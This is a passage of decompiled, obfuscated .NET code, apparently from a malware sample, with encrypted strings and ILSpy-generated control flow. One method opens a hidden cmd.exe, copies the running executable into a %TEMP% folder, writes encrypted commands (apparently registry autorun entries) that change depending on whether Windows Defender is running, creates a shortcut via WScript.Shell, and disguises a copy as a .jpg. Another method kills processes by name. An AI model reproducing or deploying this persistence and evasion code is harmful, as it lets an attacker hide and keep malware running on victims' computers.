						case 3:
							break;
						case 6:
							goto IL_0078;
						case 7:
							num2 = string_0.Length - 1;
							goto case 2;
						case 8:
							for (; i < class40_0.char_0.Length; i++)
							{
								if (class40_0.char_0[i] == c)
								{
									num = num * class40_0.char_0.Length + i;
									flag2 = true;
									break;
								}
							}
							goto default;
						case 2:
							if (num2 >= 0 && (flag || num2 != 0))
							{
								c = string_0[num2];
								flag2 = false;
								i = 0;
								goto case 8;
							}
							goto IL_00e5;
						default:
							if (flag2)
							{
								num2--;
								goto case 2;
							}
							goto case 0;
						case 0:
						case 5:
							return -1;
						case 9:
							goto IL_00e5;
						}
						continue;
					}
					goto IL_00e5;
					IL_00e5:
					return num;
				}
				break;
				IL_0078:;
			}
			return -1;
		}
		catch
		{
			return -1;
		}
	}

	static bool smethod_136(EventArgs1 eventArgs1_0)
	{
		return eventArgs1_0.bool_2;
	}

	static string smethod_137()
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(Class17.smethod_59());
			string result = default(string);
			string result2 = default(string);
			while (true)
			{
				if (registryKey == null)
				{
					if (oLMEnfKBTsIqRDPCqp())
					{
					}
					switch (4)
					{
					case 0:
					case 3:
						break;
					case 1:
					case 4:
						goto IL_0042;
					case 5:
						goto end_IL_003d;
					default:
						return result;
					case 2:
						return result;
					}
					continue;
				}
				goto IL_0052;
				IL_0042:
				registryKey = Registry.LocalMachine.OpenSubKey(Class17.smethod_147());
				goto IL_0052;
				IL_0052:
				if (registryKey == null)
				{
					return null;
				}
				result2 = (string)registryKey.GetValue("Path", null);
				registryKey.Close();
				break;
				continue;
				end_IL_003d:
				break;
			}
			return result2;
		}
		catch
		{
			return null;
		}
	}

	static void smethod_138(Exception exception_0, object object_0, object object_1)
	{
		Class17.smethod_128(exception_0, new object[2] { object_0, object_1 });
	}

	static bool smethod_139(Class26.Class35 class35_0)
	{
		return class35_0.int_8 == class35_0.int_7;
	}

	static int smethod_140(Class40.Struct14 struct14_0, Class40 class40_0)
	{
		string key = struct14_0.struct13_0.string_0.ToUpper();
		if (class40_0.dictionary_3.ContainsKey(key))
		{
			return class40_0.dictionary_3[key];
		}
		int count = class40_0.list_2.Count;
		class40_0.list_2.Add(struct14_0.struct13_0);
		class40_0.dictionary_3.Add(key, count);
		return count;
	}

	static Class48 smethod_141()
	{
		if (Class48.class48_0 == null)
		{
			Type[] types = Assembly.GetExecutingAssembly().GetTypes();
			foreach (Type type in types)
			{
				if ((object)type == null || (object)type.BaseType == null || (object)type.BaseType != typeof(Class48))
				{
					continue;
				}
				try
				{
					Class48.class48_0 = (Class48)Activator.CreateInstance(type, nonPublic: true);
					if (Class48.class48_0 != null)
					{
						break;
					}
				}
				catch
				{
				}
			}
		}
		return Class48.class48_0;
	}

	static bool smethod_142(bool bool_0, Class26.Class35 class35_0, bool bool_1)
	{
		if (class35_0.int_5 < 262 && !bool_1)
		{
			return false;
		}
		Class26.Class33 class33_3;
		byte[] byte_;
		int int_5;
		do
		{
			if (class35_0.int_5 >= 262 || bool_1)
			{
				if (class35_0.int_5 != 0)
				{
					if (class35_0.int_4 >= 65274)
					{
						Class17.smethod_190(class35_0);
					}
					int int_ = class35_0.int_1;
					int int_2 = class35_0.int_2;
					if (class35_0.int_5 >= 3)
					{
						int num = Class17.smethod_173(class35_0);
						if (num != 0 && class35_0.int_4 - num <= 32506 && Class17.smethod_125(class35_0, num) && class35_0.int_2 <= 5 && class35_0.int_2 == 3 && class35_0.int_4 - class35_0.int_1 > 4096)
						{
							class35_0.int_2 = 2;
						}
					}
					if (int_2 >= 3 && class35_0.int_2 <= int_2)
					{
						Class26.Class33 class33_ = class35_0.class33_0;
						int int_3 = class35_0.int_4 - 1 - int_;
						Class17.smethod_66(int_2, class33_, int_3);
						int_2 -= 2;
						do
						{
							class35_0.int_4++;
							class35_0.int_5--;
							if (class35_0.int_5 >= 3)
							{
								Class17.smethod_173(class35_0);
							}
						}
						while (--int_2 > 0);
						class35_0.int_4++;
						class35_0.int_5--;
						class35_0.bool_0 = false;
						class35_0.int_2 = 2;
					}
					else
					{
						if (class35_0.bool_0)
						{
							Class26.Class33 class33_2 = class35_0.class33_0;
							int int_4 = class35_0.byte_0[class35_0.int_4 - 1] & 0xFF;
							Class17.smethod_76(int_4, class33_2);
						}
						class35_0.bool_0 = true;
						class35_0.int_4++;
						class35_0.int_5--;
					}
					continue;
				}
				if (class35_0.bool_0)
				{
					Class26.Class33 class33_2 = class35_0.class33_0;
					int int_4 = class35_0.byte_0[class35_0.int_4 - 1] & 0xFF;
					Class17.smethod_76(int_4, class33_2);
				}
				class35_0.bool_0 = false;
				class33_3 = class35_0.class33_0;
				byte_ = class35_0.byte_0;
				int_5 = class35_0.int_3;
				int int_6 = class35_0.int_4 - class35_0.int_3;
				Class17.smethod_168(int_6, class33_3, int_5, byte_, bool_0);
				class35_0.int_3 = class35_0.int_4;
				return false;
			}
			return true;
		}
		while (!Class17.smethod_169(class35_0.class33_0));
		int num2 = class35_0.int_4 - class35_0.int_3;
		if (class35_0.bool_0)
		{
			num2--;
		}
		bool flag = bool_0 && class35_0.int_5 == 0 && !class35_0.bool_0;
		class33_3 = class35_0.class33_0;
		byte_ = class35_0.byte_0;
		int_5 = class35_0.int_3;
		Class17.smethod_168(num2, class33_3, int_5, byte_, flag);
		class35_0.int_3 += num2;
		return !flag;
	}

	static void smethod_143()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		Process process = default(Process);
		string text = default(string);
		object executablePath = default(object);
		StreamWriter standardInput = default(StreamWriter);
		string text5 = default(string);
		string text6 = default(string);
		string text7 = default(string);
		string text8 = default(string);
		string text9 = default(string);
		object objectValue = default(object);
		object objectValue2 = default(object);
		object obj = default(object);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				string text2;
				string text3;
				string text4;
				string text10;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 2008:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0035;
						case 4:
							goto IL_0058;
						case 5:
							goto IL_0062;
						case 6:
							goto IL_0098;
						case 7:
							goto IL_00b2;
						case 8:
							goto IL_00bb;
						case 9:
							goto IL_011e;
						case 10:
							goto IL_0133;
						case 11:
							goto IL_0144;
						case 12:
							goto IL_0155;
						case 13:
							goto IL_0166;
						case 14:
							goto IL_0177;
						case 15:
							goto IL_0188;
						case 16:
							goto IL_0194;
						case 17:
							goto IL_01a0;
						case 18:
							goto IL_01aa;
						case 19:
							goto IL_01b5;
						case 20:
							goto IL_01c0;
						case 21:
							goto IL_01cb;
						case 22:
							goto IL_01d6;
						case 23:
							goto IL_0255;
						case 24:
							goto IL_0265;
						case 25:
							goto IL_02c9;
						case 27:
							goto IL_02dc;
						case 28:
							goto IL_02e0;
						case 29:
							goto IL_034a;
						case 30:
							goto IL_0355;
						case 31:
							goto IL_0367;
						case 32:
							goto IL_0381;
						case 33:
							goto IL_03a2;
						case 34:
							goto IL_040b;
						case 35:
							goto IL_046f;
						case 36:
							goto IL_04d3;
						case 37:
							goto IL_04fa;
						case 38:
							goto IL_0516;
						case 39:
							goto IL_0532;
						case 26:
						case 40:
						case 41:
							goto IL_059b;
						case 42:
							goto IL_05f4;
						case 43:
							goto IL_0657;
						case 44:
						case 45:
							goto IL_06c4;
						case 46:
							goto IL_06dd;
						case 47:
							goto IL_06e8;
						case 48:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 49:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_06e8:
					num = 47;
					process.Kill();
					break;
					IL_0008:
					num = 2;
					text = "" + Interaction.Environ(Class17.smethod_86("5g+BxFHXkdTcEM3cEGgk0A==")) + Class17.smethod_86("923lYoAhb2vVXIM6u3MCzjKugVDBXZMcbb6ThbsL5r8=") + "";
					goto IL_0035;
					IL_0035:
					num = 3;
					text2 = Interaction.Environ(Class17.smethod_86("5g+BxFHXkdTcEM3cEGgk0A==")) + Class17.smethod_86("sscpRZTSpuugDgOvmaPPPu6b/X9gZRYeKcyavwZ3WPM=");
					goto IL_0058;
					IL_0058:
					num = 4;
					process = new Process();
					goto IL_0062;
					IL_0062:
					num = 5;
					text3 = Interaction.Environ(Class17.smethod_86("5g+BxFHXkdTcEM3cEGgk0A==")) + Class17.smethod_86("sscpRZTSpuugDgOvmaPPPu6b/X9gZRYeKcyavwZ3WPM=") + Class17.smethod_86("iXIzM98Pjl/u+zlU/h5Dfl19cMP29BJLIWFLWajNT92OKqOYE9q1PcctiVmnH8Ed") + Class17.smethod_86("dI0mWYVQ2eg7SQnnGlyChw==");
					goto IL_0098;
					IL_0098:
					num = 6;
					Directory.CreateDirectory(text + Class17.smethod_86("fEzc44351CMchjFeeY23eA=="));
					goto IL_00b2;
					IL_00b2:
					num = 7;
					executablePath = Application.get_ExecutablePath();
					goto IL_00bb;
					IL_00bb:
					num = 8;
					text4 = "" + Interaction.Environ(Class17.smethod_86("5g+BxFHXkdTcEM3cEGgk0A==")) + Class17.smethod_86("923lYoAhb2vVXIM6u3MCzjKugVDBXZMcbb6ThbsL5r8=") + Class17.smethod_86("fEzc44351CMchjFeeY23eA==") + "\\" + Class17.smethod_86("dI0mWYVQ2eg7SQnnGlyChw==");
					goto IL_011e;
					IL_011e:
					num = 9;
					process.StartInfo.FileName = "cmd.exe";
					goto IL_0133;
					IL_0133:
					num = 10;
					process.StartInfo.RedirectStandardOutput = true;
					goto IL_0144;
					IL_0144:
					num = 11;
					process.StartInfo.RedirectStandardInput = true;
					goto IL_0155;
					IL_0155:
					num = 12;
					process.StartInfo.UseShellExecute = false;
					goto IL_0166;
					IL_0166:
					num = 13;
					process.StartInfo.CreateNoWindow = true;
					goto IL_0177;
					IL_0177:
					num = 14;
					process.StartInfo.RedirectStandardError = true;
					goto IL_0188;
					IL_0188:
					num = 15;
					process.Start();
					goto IL_0194;
					IL_0194:
					num = 16;
					standardInput = process.StandardInput;
					goto IL_01a0;
					IL_01a0:
					num = 17;
					text5 = "cop";
					goto IL_01aa;
					IL_01aa:
					num = 18;
					text6 = "y ";
					goto IL_01b5;
					IL_01b5:
					num = 19;
					standardInput.AutoFlush = true;
					goto IL_01c0;
					IL_01c0:
					num = 20;
					text7 = "%temp%\\";
					goto IL_01cb;
					IL_01cb:
					num = 21;
					text8 = ".lnk";
					goto IL_01d6;
					IL_01d6:
					num = 22;
					standardInput.Write(text5 + text6 + "\"" + Application.get_ExecutablePath() + "\" \"" + text7 + Class17.smethod_86("fEzc44351CMchjFeeY23eA==") + "\\" + Class17.smethod_86("dI0mWYVQ2eg7SQnnGlyChw==") + "\" /Y" + Environment.NewLine);
					goto IL_0255;
					IL_0255:
					num = 23;
					if (Class17.smethod_30("MsMpEng"))
					{
						goto IL_0265;
					}
					goto IL_02dc;
					IL_0265:
					num = 24;
					standardInput.Write(Class17.smethod_86("04gH48xsNOUf+H7cCLcQbtVo+n2CPnhoK4m4jmlO9kUKlPfgFZIYHte5sEFXVfO17fYxlnA2aVC5aaTAAEGBlnIXKfM49/5SbjLev7dUVnTkJKF7YnQ/Aj9mLKSIhAHV") + text7 + Class17.smethod_86("fEzc44351CMchjFeeY23eA==") + "\\" + Class17.smethod_86("dI0mWYVQ2eg7SQnnGlyChw==") + "\" /f" + Environment.NewLine);
					goto IL_02c9;
					IL_02c9:
					num = 25;
					Thread.Sleep(7000);
					goto IL_059b;
					IL_02dc:
					num = 27;
					goto IL_02e0;
					IL_02e0:
					num = 28;
					standardInput.Write(Class17.smethod_86("04gH48xsNOUf+H7cCLcQbtVo+n2CPnhoK4m4jmlO9kUKlPfgFZIYHte5sEFXVfO17fYxlnA2aVC5aaTAAEGBlnIXKfM49/5SbjLev7dUVnTkJKF7YnQ/Aj9mLKSIhAHV") + text7 + Class17.smethod_86("fEzc44351CMchjFeeY23eA==") + "\\" + Class17.smethod_86("dI0mWYVQ2eg7SQnnGlyChw==") + text8 + "\" /f" + Environment.NewLine);
					goto IL_034a;
					IL_034a:
					num = 29;
					text9 = "WScrip";
					goto IL_0355;
					IL_0355:
					num = 30;
					text10 = text9 + "t.Shell";
					goto IL_0367;
					IL_0367:
					num = 31;
					objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("", ""));
					goto IL_0381;
					IL_0381:
					num = 32;
					objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject(text9 + "t.Shell", ""));
					goto IL_03a2;
					IL_03a2:
					num = 33;
					objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, "CreateShortcut", new object[1] { text + Class17.smethod_86("fEzc44351CMchjFeeY23eA==") + "\\" + Class17.smethod_86("dI0mWYVQ2eg7SQnnGlyChw==") + text8 }, (string[])null, (Type[])null, (bool[])null));
					goto IL_040b;
					IL_040b:
					num = 34;
					NewLateBinding.LateSet(objectValue2, (Type)null, "TargetPath", new object[1] { RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, "ExpandEnvironmentStrings", new object[1] { text + Class17.smethod_86("fEzc44351CMchjFeeY23eA==") + "\\" + Class17.smethod_86("dI0mWYVQ2eg7SQnnGlyChw==") }, (string[])null, (Type[])null, (bool[])null)) }, (string[])null, (Type[])null);
					goto IL_046f;
					IL_046f:
					num = 35;
					NewLateBinding.LateSet(obj, (Type)null, "TargetPath", new object[1] { RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, "ExpandEnvironmentStrings", new object[1] { text + Class17.smethod_86("fEzc44351CMchjFeeY23eA==") + "\\" + Class17.smethod_86("dI0mWYVQ2eg7SQnnGlyChw==") }, (string[])null, (Type[])null, (bool[])null)) }, (string[])null, (Type[])null);
					goto IL_04d3;
					IL_04d3:
					num = 36;
					NewLateBinding.LateSet(objectValue2, (Type)null, "WindowStyle", new object[1] { 4 }, (string[])null, (Type[])null);
					goto IL_04fa;
					IL_04fa:
					num = 37;
					NewLateBinding.LateCall(objectValue2, (Type)null, "Save", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					goto IL_0516;
					IL_0516:
					num = 38;
					NewLateBinding.LateCall(obj, (Type)null, "Save", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					goto IL_0532;
					IL_0532:
					num = 39;
					standardInput.Write(Class17.smethod_86("tooEKUPNPCsRNkaS3Hueqar3hTgD3+UMaiKlVz9fNin2nXZ/+dc8OLhhu6kefhMV") + text7 + Class17.smethod_86("fEzc44351CMchjFeeY23eA==") + "\\" + Class17.smethod_86("dI0mWYVQ2eg7SQnnGlyChw==") + Class17.smethod_86("N2125ojyLfd5vRuYzSjpwfaddn/51zw4uGG7qR5+ExU=") + Environment.NewLine);
					goto IL_059b;
					IL_059b:
					num = 41;
					if (!File.Exists(Interaction.Environ("TEMP") + "\\" + Class17.smethod_86("fEzc44351CMchjFeeY23eA==") + "\\" + Class17.smethod_86("dI0mWYVQ2eg7SQnnGlyChw==")))
					{
						goto IL_05f4;
					}
					goto IL_06c4;
					IL_05f4:
					num = 42;
					File.Copy(Conversions.ToString(executablePath), Interaction.Environ("TEMP") + "\\" + Class17.smethod_86("fEzc44351CMchjFeeY23eA==") + "\\" + Class17.smethod_86("dI0mWYVQ2eg7SQnnGlyChw==") + ".jpg");
					goto IL_0657;
					IL_0657:
					num = 43;
					standardInput.Write("ren \"" + text7 + Class17.smethod_86("fEzc44351CMchjFeeY23eA==") + "\\" + Class17.smethod_86("dI0mWYVQ2eg7SQnnGlyChw==") + ".jpg\" " + Class17.smethod_86("dI0mWYVQ2eg7SQnnGlyChw==") + Environment.NewLine);
					goto IL_06c4;
					IL_06c4:
					num = 45;
					standardInput.Write("exit" + Environment.NewLine);
					goto IL_06dd;
					IL_06dd:
					num = 46;
					process.WaitForExit();
					goto IL_06e8;
					end_IL_0000_2:
					break;
				}
				num = 48;
				standardInput.Flush();
				break;
				end_IL_0000:;
			}
			catch (object obj2) when (obj2 is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj2);
				try0000_dispatch = 2008;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	static Exception smethod_144(EventArgs1 eventArgs1_0)
	{
		return eventArgs1_0.exception_0;
	}

	static byte[] smethod_145(byte[] byte_0, byte[] byte_1, byte[] byte_2, int int_0)
	{
		try
		{
			Class26.Stream0 stream = new Class26.Stream0();
			switch (int_0)
			{
			case 0:
			{
				Class26.Class32 class32_2 = new Class26.Class32();
				DateTime now = DateTime.Now;
				long num3 = (uint)((((now.Year - 1980) & 0x7F) << 25) | (now.Month << 21) | (now.Day << 16) | (now.Hour << 11) | (now.Minute << 5) | (int)((uint)now.Second >> 1));
				uint[] array8 = new uint[256]
				{
					0u, 1996959894u, 3993919788u, 2567524794u, 124634137u, 1886057615u, 3915621685u, 2657392035u, 249268274u, 2044508324u,
					3772115230u, 2547177864u, 162941995u, 2125561021u, 3887607047u, 2428444049u, 498536548u, 1789927666u, 4089016648u, 2227061214u,
					450548861u, 1843258603u, 4107580753u, 2211677639u, 325883990u, 1684777152u, 4251122042u, 2321926636u, 335633487u, 1661365465u,
					4195302755u, 2366115317u, 997073096u, 1281953886u, 3579855332u, 2724688242u, 1006888145u, 1258607687u, 3524101629u, 2768942443u,
					901097722u, 1119000684u, 3686517206u, 2898065728u, 853044451u, 1172266101u, 3705015759u, 2882616665u, 651767980u, 1373503546u,
					3369554304u, 3218104598u, 565507253u, 1454621731u, 3485111705u, 3099436303u, 671266974u, 1594198024u, 3322730930u, 2970347812u,
					795835527u, 1483230225u, 3244367275u, 3060149565u, 1994146192u, 31158534u, 2563907772u, 4023717930u, 1907459465u, 112637215u,
					2680153253u, 3904427059u, 2013776290u, 251722036u, 2517215374u, 3775830040u, 2137656763u, 141376813u, 2439277719u, 3865271297u,
					1802195444u, 476864866u, 2238001368u, 4066508878u, 1812370925u, 453092731u, 2181625025u, 4111451223u, 1706088902u, 314042704u,
					2344532202u, 4240017532u, 1658658271u, 366619977u, 2362670323u, 4224994405u, 1303535960u, 984961486u, 2747007092u, 3569037538u,
					1256170817u, 1037604311u, 2765210733u, 3554079995u, 1131014506u, 879679996u, 2909243462u, 3663771856u, 1141124467u, 855842277u,
					2852801631u, 3708648649u, 1342533948u, 654459306u, 3188396048u, 3373015174u, 1466479909u, 544179635u, 3110523913u, 3462522015u,
					1591671054u, 702138776u, 2966460450u, 3352799412u, 1504918807u, 783551873u, 3082640443u, 3233442989u, 3988292384u, 2596254646u,
					62317068u, 1957810842u, 3939845945u, 2647816111u, 81470997u, 1943803523u, 3814918930u, 2489596804u, 225274430u, 2053790376u,
					3826175755u, 2466906013u, 167816743u, 2097651377u, 4027552580u, 2265490386u, 503444072u, 1762050814u, 4150417245u, 2154129355u,
					426522225u, 1852507879u, 4275313526u, 2312317920u, 282753626u, 1742555852u, 4189708143u, 2394877945u, 397917763u, 1622183637u,
					3604390888u, 2714866558u, 953729732u, 1340076626u, 3518719985u, 2797360999u, 1068828381u, 1219638859u, 3624741850u, 2936675148u,
					906185462u, 1090812512u, 3747672003u, 2825379669u, 829329135u, 1181335161u, 3412177804u, 3160834842u, 628085408u, 1382605366u,
					3423369109u, 3138078467u, 570562233u, 1426400815u, 3317316542u, 2998733608u, 733239954u, 1555261956u, 3268935591u, 3050360625u,
					752459403u, 1541320221u, 2607071920u, 3965973030u, 1969922972u, 40735498u, 2617837225u, 3943577151u, 1913087877u, 83908371u,
					2512341634u, 3803740692u, 2075208622u, 213261112u, 2463272603u, 3855990285u, 2094854071u, 198958881u, 2262029012u, 4057260610u,
					1759359992u, 534414190u, 2176718541u, 4139329115u, 1873836001u, 414664567u, 2282248934u, 4279200368u, 1711684554u, 285281116u,
					2405801727u, 4167216745u, 1634467795u, 376229701u, 2685067896u, 3608007406u, 1308918612u, 956543938u, 2808555105u, 3495958263u,
					1231636301u, 1047427035u, 2932959818u, 3654703836u, 1088359270u, 936918000u, 2847714899u, 3736837829u, 1202900863u, 817233897u,
					3183342108u, 3401237130u, 1404277552u, 615818150u, 3134207493u, 3453421203u, 1423857449u, 601450431u, 3009837614u, 3294710456u,
					1567103746u, 711928724u, 3020668471u, 3272380065u, 1510334235u, 755167117u
				};
				uint num4 = uint.MaxValue;
				uint num5 = uint.MaxValue;
				int num6 = 0;
				int num7 = byte_2.Length;
				while (--num7 >= 0)
				{
					num5 = array8[(num5 ^ byte_2[num6++]) & 0xFF] ^ (num5 >> 8);
				}
				num5 ^= num4;
				Class17.smethod_134(67324752, stream);
				Class17.smethod_14(stream, 20);
				Class17.smethod_14(stream, 0);
				Class17.smethod_14(stream, 8);
				Class17.smethod_134((int)num3, stream);
				Class17.smethod_134((int)num5, stream);
				long position3 = stream.Position;
				Class17.smethod_134(0, stream);
				Class17.smethod_134(byte_2.Length, stream);
				byte[] bytes = Encoding.UTF8.GetBytes("{data}");
				Class17.smethod_14(stream, bytes.Length);
				Class17.smethod_14(stream, 0);
				stream.Write(bytes, 0, bytes.Length);
				Class17.smethod_172(class32_2, byte_2);
				while (!Class17.smethod_35(class32_2))
				{
					byte[] array9 = new byte[512];
					int num8 = Class17.smethod_130(class32_2, array9);
					if (num8 <= 0)
					{
						break;
					}
					stream.Write(array9, 0, num8);
				}
				Class17.smethod_132(class32_2);
				while (!Class17.smethod_57(class32_2))
				{
					byte[] array10 = new byte[512];
					int num9 = Class17.smethod_130(class32_2, array10);
					if (num9 <= 0)
					{
						break;
					}
					stream.Write(array10, 0, num9);
				}
				long num10 = Class17.smethod_15(class32_2);
				Class17.smethod_134(33639248, stream);
				Class17.smethod_14(stream, 20);
				Class17.smethod_14(stream, 20);
				Class17.smethod_14(stream, 0);
				Class17.smethod_14(stream, 8);
				Class17.smethod_134((int)num3, stream);
				Class17.smethod_134((int)num5, stream);
				Class17.smethod_134((int)num10, stream);
				Class17.smethod_134(byte_2.Length, stream);
				Class17.smethod_14(stream, bytes.Length);
				Class17.smethod_14(stream, 0);
				Class17.smethod_14(stream, 0);
				Class17.smethod_14(stream, 0);
				Class17.smethod_14(stream, 0);
				Class17.smethod_134(0, stream);
				Class17.smethod_134(0, stream);
				stream.Write(bytes, 0, bytes.Length);
				Class17.smethod_134(101010256, stream);
				Class17.smethod_14(stream, 0);
				Class17.smethod_14(stream, 0);
				Class17.smethod_14(stream, 1);
				Class17.smethod_14(stream, 1);
				Class17.smethod_134(46 + bytes.Length, stream);
				Class17.smethod_134((int)(30 + bytes.Length + num10), stream);
				Class17.smethod_14(stream, 0);
				stream.Seek(position3, SeekOrigin.Begin);
				Class17.smethod_134((int)num10, stream);
				break;
			}
			case 1:
			{
				Class17.smethod_134(25000571, stream);
				Class17.smethod_134(byte_2.Length, stream);
				byte[] array5;
				for (int i = 0; i < byte_2.Length; i += array5.Length)
				{
					array5 = new byte[Math.Min(2097151, byte_2.Length - i)];
					Buffer.BlockCopy(byte_2, i, array5, 0, array5.Length);
					long position = stream.Position;
					Class17.smethod_134(0, stream);
					Class17.smethod_134(array5.Length, stream);
					Class26.Class32 class32_ = new Class26.Class32();
					Class17.smethod_172(class32_, array5);
					while (!Class17.smethod_35(class32_))
					{
						byte[] array6 = new byte[512];
						int num = Class17.smethod_130(class32_, array6);
						if (num <= 0)
						{
							break;
						}
						stream.Write(array6, 0, num);
					}
					Class17.smethod_132(class32_);
					while (!Class17.smethod_57(class32_))
					{
						byte[] array7 = new byte[512];
						int num2 = Class17.smethod_130(class32_, array7);
						if (num2 <= 0)
						{
							break;
						}
						stream.Write(array7, 0, num2);
					}
					long position2 = stream.Position;
					stream.Position = position;
					Class17.smethod_134((int)Class17.smethod_15(class32_), stream);
					stream.Position = position2;
				}
				break;
			}
			case 2:
			{
				Class17.smethod_134(41777787, stream);
				byte[] array3 = Class17.smethod_145((byte[])null, (byte[])null, byte_2, 1);
				using (ICryptoTransform cryptoTransform2 = Class17.smethod_123(bool_0: false, byte_1, byte_0))
				{
					byte[] array4 = cryptoTransform2.TransformFinalBlock(array3, 0, array3.Length);
					stream.Write(array4, 0, array4.Length);
				}
				break;
			}
			case 3:
			{
				Class17.smethod_134(58555003, stream);
				byte[] array = Class17.smethod_145((byte[])null, (byte[])null, byte_2, 1);
				using (ICryptoTransform cryptoTransform = Class17.smethod_104(bool_0: false, byte_1, byte_0))
				{
					byte[] array2 = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
					stream.Write(array2, 0, array2.Length);
				}
				break;
			}
			}
			stream.Flush();
			stream.Close();
			return stream.ToArray();
		}
		catch (Exception ex)
		{
			Class26.string_0 = "ERR 2003: " + ex.Message;
			throw;
		}
	}

	static byte[] smethod_146(byte[] byte_0, string string_0)
	{
		if (oLMEnfKBTsIqRDPCqp())
		{
		}
		RijndaelManaged rijndaelManaged = default(RijndaelManaged);
		RSACryptoServiceProvider rSACryptoServiceProvider = default(RSACryptoServiceProvider);
		MemoryStream memoryStream = default(MemoryStream);
		CryptoStream cryptoStream = default(CryptoStream);
		switch (4)
		{
		case 0:
		case 4:
			if (string_0.StartsWith("{"))
			{
				goto case 2;
			}
			rijndaelManaged = null;
			goto default;
		case 2:
			Class38.string_0 = "ERR 2006: This template was not properly processed by SmartAssembly";
			goto case 1;
		case 1:
			return null;
		default:
			rSACryptoServiceProvider = null;
			memoryStream = null;
			cryptoStream = null;
			break;
		case 6:
			break;
		}
		try
		{
			rijndaelManaged = new RijndaelManaged();
			rSACryptoServiceProvider = new RSACryptoServiceProvider();
			rSACryptoServiceProvider.FromXmlString(string_0);
			rijndaelManaged.GenerateKey();
			rijndaelManaged.GenerateIV();
			byte[] array = new byte[48];
			Buffer.BlockCopy(rijndaelManaged.Key, 0, array, 0, 32);
			Buffer.BlockCopy(rijndaelManaged.IV, 0, array, 32, 16);
			memoryStream = new MemoryStream();
			try
			{
				byte[] array2 = rSACryptoServiceProvider.Encrypt(array, fOAEP: false);
				memoryStream.WriteByte(1);
				memoryStream.WriteByte(Convert.ToByte(array2.Length / 8));
				memoryStream.Write(array2, 0, array2.Length);
			}
			catch (CryptographicException)
			{
				try
				{
					byte[] array3 = new byte[16];
					byte[] array4 = new byte[16];
					Buffer.BlockCopy(rijndaelManaged.Key, 0, array3, 0, 16);
					Buffer.BlockCopy(rijndaelManaged.Key, 16, array4, 0, 16);
					byte[] array5 = rSACryptoServiceProvider.Encrypt(array3, fOAEP: false);
					byte[] array6 = rSACryptoServiceProvider.Encrypt(array4, fOAEP: false);
					byte[] array7 = rSACryptoServiceProvider.Encrypt(rijndaelManaged.IV, fOAEP: false);
					memoryStream.WriteByte(2);
					memoryStream.WriteByte(Convert.ToByte(array5.Length / 8));
					memoryStream.Write(array5, 0, array5.Length);
					memoryStream.Write(array6, 0, array6.Length);
					memoryStream.Write(array7, 0, array7.Length);
				}
				catch (CryptographicException)
				{
					Class38.string_0 = "ERR 2005: The 128-bit encryption is not available on this computer. You need to install the High Encryption Pack in order to use the reporting feature.";
					return null;
				}
			}
			cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			cryptoStream.Write(byte_0, 0, byte_0.Length);
			cryptoStream.FlushFinalBlock();
			return memoryStream.ToArray();
		}
		catch (Exception ex3)
		{
			Class38.string_0 = "ERR 2004: " + ex3.Message;
			return null;
		}
		finally
		{
			rijndaelManaged?.Clear();
			rSACryptoServiceProvider?.Clear();
			memoryStream?.Close();
			cryptoStream?.Close();
		}
	}

	static string smethod_147()
	{
		return "Software\\Wow6432Node\\Red Gate\\" + Class17.smethod_79();
	}

	[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
	[return: MarshalAs(UnmanagedType.Bool)]
	internal static extern bool StrongNameSignatureVerificationEx_4([MarshalAs(UnmanagedType.LPWStr)] string string_0, [MarshalAs(UnmanagedType.Bool)] bool bool_0, [MarshalAs(UnmanagedType.Bool)] out bool bool_1);

	static void smethod_148()
	{
		string text = "";
	}

	[DllImport("wldap32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	internal static extern long ldap_modrdn(ref Class12 class12_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_1);

	static void smethod_149()
	{
		//IL_005c: Unknown result type (might be due to invalid IL or missing references)
		Process[] processesByName = Process.GetProcessesByName("qJ1rx6zo0JWv6cXezCyOGQ== ");
		if (processesByName.Length <= 0)
		{
			return;
		}
		checked
		{
			int num = processesByName.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				if (!processesByName[i].HasExited && (double)processesByName[i].WorkingSet64 / 1024.0 < 130.0)
				{
					try
					{
						processesByName[i].Kill();
					}
					catch (Exception ex)
					{
						ProjectData.SetProjectError(ex);
						Exception ex2 = ex;
						MessageBox.Show(ex2.Message);
						ProjectData.ClearProjectError();
					}
				}
			}
		}
	}

	[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
	[return: MarshalAs(UnmanagedType.Bool)]
	internal static extern bool StrongNameSignatureVerificationEx_5([MarshalAs(UnmanagedType.LPWStr)] string string_0, [MarshalAs(UnmanagedType.Bool)] bool bool_0, [MarshalAs(UnmanagedType.Bool)] out bool bool_1);

	static int smethod_150(Class26.Class33 class33_0, int int_0)
	{
		int num = 0;
